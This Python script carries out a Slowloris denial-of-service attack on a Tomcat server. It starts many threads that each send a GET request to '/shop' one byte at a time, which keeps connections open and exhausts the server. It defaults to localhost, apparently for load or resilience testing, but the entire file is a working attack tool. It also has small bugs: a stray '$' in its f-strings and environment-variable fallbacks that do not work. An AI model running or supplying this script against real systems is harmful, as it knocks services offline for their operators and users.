import socket
import logging
import threading
import time
import os

logging.root.setLevel(logging.DEBUG)

# Number of requests to initiate in total
NUM_REQUESTS_TO_START = int(os.environ["NUM_REQUESTS_TO_START"]) or 200
# Delay (secs) between each concurrent request thread
TIME_BETWEEN_REQUESTS = float(os.environ["TIME_BETWEEN_REQUESTS"]) or 0.05
# Delay (secs) between each byte sent to server
TIME_BETWEEN_BYTES = float(os.environ["TIME_BETWEEN_BYTES"]) or 1
# Hostname of the tomcat server
HOST = os.environ['HOST'] or 'localhost'
# tomcat server port
PORT = int(os.environ['PORT']) or 8888

logging.debug(f'NUM_REQUESTS_TO_START={NUM_REQUESTS_TO_START}')
logging.debug(f'TIME_BETWEEN_REQUESTS={TIME_BETWEEN_REQUESTS}')
logging.debug(f'TIME_BETWEEN_BYTES={TIME_BETWEEN_BYTES}')
logging.debug(f'HOST={HOST}')
logging.debug(f'PORT={PORT}')


def slow_request(name: str, http_request: str):
    logging.debug("Sending request (%s), total request size %d bytes", name, len(http_request))
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        for char in http_request:
            s.sendall(str.encode(char))
            time.sleep(TIME_BETWEEN_BYTES)
        data = s.recv(1024)
    logging.debug('Response for request (%s): %s', name, repr(data))


def as_get_request(path: str):
    lines = [
        f'GET ${path} HTTP/1.1',
        'Accept: text/html',
        'Cache-Control: no-cache',
        'Connection: keep-alive',
        f'Host: ${HOST}:${PORT}'
    ]
    return '\r\n'.join(lines) + '\r\n'


def slow_loris_attack():
    get_request = as_get_request("/shop")

    for request_num in range(NUM_REQUESTS_TO_START):
        threading.Thread(target=slow_request, args=(str(request_num), get_request,)).start()
        time.sleep(TIME_BETWEEN_REQUESTS)


if __name__ == '__main__':
    slow_loris_attack()
